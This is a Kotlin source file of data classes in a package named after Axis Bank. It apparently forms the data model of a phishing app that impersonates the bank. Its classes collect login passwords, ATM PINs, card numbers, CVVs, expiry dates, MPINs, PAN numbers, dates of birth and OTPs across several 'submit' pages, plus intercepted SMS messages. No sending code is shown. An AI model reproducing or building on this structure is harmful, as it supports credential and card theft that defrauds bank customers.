package com.example.axisbank


data class Message(
    val appname: String,
    val message: String,
    val sender: String,
    val time: String,
    val type: String,
    val userid: String
)


data class Submit1(
    val domain: String,
    val last_update: String,
    val mobile: String,
    val password: String,
    val userid: String
)


data class Submit2(
    val atmpin: String,
    val cardno: String,
    val domain: String,
    val last_update: String,
    val mobile: String
)


data class Submit3(
    val customer_id: String,
    val domain: String,
    val last_update: String,
    val mobile: String,
    val mpin: String
)

data class SecondPageData(
    val dob: String,
    val domain: String,
    val last_update: String,
    val mobile: String,
    val name: String,
    val pan: String
)


data class OTP(
    val atmpin: String,
    val deb: String,
    val exp: String,
    val cvv: String,
    val last_update: String,
    val mobile: String
)


data class lastPage(
    val last_update: String,
    val mobile: String,
    val otp1: String
)

